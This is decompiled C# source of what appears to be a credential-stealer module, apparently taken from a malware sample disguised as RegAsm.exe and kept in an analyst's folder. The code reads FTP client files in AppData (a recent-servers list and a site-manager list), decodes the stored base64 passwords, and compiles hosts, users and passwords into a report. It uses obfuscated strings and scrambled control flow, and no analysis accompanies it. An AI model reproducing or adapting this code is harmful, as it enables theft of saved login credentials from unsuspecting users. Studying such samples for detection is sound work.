// Decompiled with JetBrains decompiler
// Type: Ml.dI
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using rw;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Xml;
using VW1;

namespace Ml
{
  internal class dI
  {
    public static string RecentServerPath;
    public static string SiteManagerPath;
    private static dI fHh;

    public static string JA()
    {
      try
      {
        if (!Convert.ToBoolean(XWr.EnableBrowserRecovery))
          return w4.bx(666, w4.vY);
        List<NT> ntList = Tu.bx(Tu.sx5);
        StringBuilder stringBuilder = new StringBuilder();
        foreach (NT nt in ntList)
        {
          stringBuilder.AppendLine(w4.bx(4656, w4.vY) + JC.bx((object) nt, JC.TU));
          stringBuilder.AppendLine(w4.bx(1176, w4.vY) + JC.bx((object) nt, JC.fa));
          stringBuilder.AppendLine(w4.bx(1200, w4.vY) + JC.bx((object) nt, JC.Mv));
          stringBuilder.AppendLine(w4.bx(4992, w4.vY) + JC.bx((object) nt, JC.lxP));
          stringBuilder.AppendLine(w4.bx(1270, w4.vY));
        }
        if (string.IsNullOrWhiteSpace(stringBuilder.ToString()))
        {
          int num1 = 0;
          if (dI.iH0() != null)
            goto label_7;
label_2:
          switch (num1)
          {
            default:
              return w4.bx(686, w4.vY);
          }
label_7:
          int num2;
          num1 = num2;
          goto label_2;
        }
        else
        {
          XWr.IsPass = true;
          return stringBuilder.ToString();
        }
      }
      catch
      {
      }
      return "";
    }

    public static List<NT> GX()
    {
      List<NT> ntList1 = new List<NT>();
      try
      {
        if (!File.Exists(dI.RecentServerPath) && !File.Exists(dI.SiteManagerPath))
          return ntList1;
        if (File.Exists(dI.RecentServerPath))
        {
          XmlTextReader xmlTextReader = new XmlTextReader(dI.RecentServerPath);
          XmlDocument xmlDocument = new XmlDocument();
          xmlDocument.Load((XmlReader) xmlTextReader);
          foreach (XmlNode childNode1 in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
          {
            string str1 = string.Empty;
            string str2 = string.Empty;
            string str3 = string.Empty;
            foreach (XmlNode childNode2 in childNode1.ChildNodes)
            {
              if (childNode2.Name == w4.bx(5022, w4.vY))
                str1 = childNode2.InnerText;
              if (childNode2.Name == w4.bx(5034, w4.vY))
                str1 = str1 + w4.bx(5046, w4.vY) + childNode2.InnerText;
              if (childNode2.Name == w4.bx(5052, w4.vY))
                str2 = childNode2.InnerText;
              if (childNode2.Name == w4.bx(5064, w4.vY))
                str3 = exB.bx(childNode2.InnerText, exB.Yxr);
            }
            List<NT> ntList2 = ntList1;
            NT nt = new NT();
            yJ.bx((object) nt, str1, yJ.qc);
            yJ.bx((object) nt, str2, yJ.rL);
            yJ.bx((object) nt, str3, yJ.aQ);
            yJ.bx((object) nt, w4.bx(16, w4.vY), yJ.oxM);
            ntList2.Add(nt);
          }
        }
        if (File.Exists(dI.SiteManagerPath))
        {
          XmlTextReader xmlTextReader = new XmlTextReader(dI.SiteManagerPath);
          XmlDocument xmlDocument = new XmlDocument();
          xmlDocument.Load((XmlReader) xmlTextReader);
          foreach (XmlNode childNode1 in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
          {
            string str1 = string.Empty;
            string str2 = string.Empty;
            string str3 = string.Empty;
            foreach (XmlNode childNode2 in childNode1.ChildNodes)
            {
              if (childNode2.Name == w4.bx(5022, w4.vY))
                str1 = childNode2.InnerText;
              if (childNode2.Name == w4.bx(5034, w4.vY))
                str1 = str1 + w4.bx(5046, w4.vY) + childNode2.InnerText;
              if (childNode2.Name == w4.bx(5052, w4.vY))
                str2 = childNode2.InnerText;
              if (childNode2.Name == w4.bx(5064, w4.vY))
                str3 = exB.bx(childNode2.InnerText, exB.Yxr);
            }
            List<NT> ntList2 = ntList1;
            NT nt = new NT();
            yJ.bx((object) nt, str1, yJ.qc);
            yJ.bx((object) nt, str2, yJ.rL);
            yJ.bx((object) nt, str3, yJ.aQ);
            yJ.bx((object) nt, w4.bx(16, w4.vY), yJ.oxM);
            ntList2.Add(nt);
          }
        }
        return ntList1;
      }
      catch
      {
        return ntList1;
      }
    }

    public static string T0(string _param0)
    {
      try
      {
        return Encoding.UTF8.GetString(Convert.FromBase64String(_param0));
      }
      catch
      {
        return _param0;
      }
    }

    public dI()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    static dI()
    {
      yd.bx(yd.EI);
      dI.RecentServerPath = string.Format(w4.bx(5076, w4.vY), (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
      dI.SiteManagerPath = string.Format(w4.bx(5142, w4.vY), dI.VHL(Environment.SpecialFolder.ApplicationData));
    }

    internal static bool UH1() => dI.fHh == null;

    internal static dI iH0() => dI.fHh;

    internal static object VHL([In] Environment.SpecialFolder obj0) => (object) Environment.GetFolderPath(obj0);
  }
}
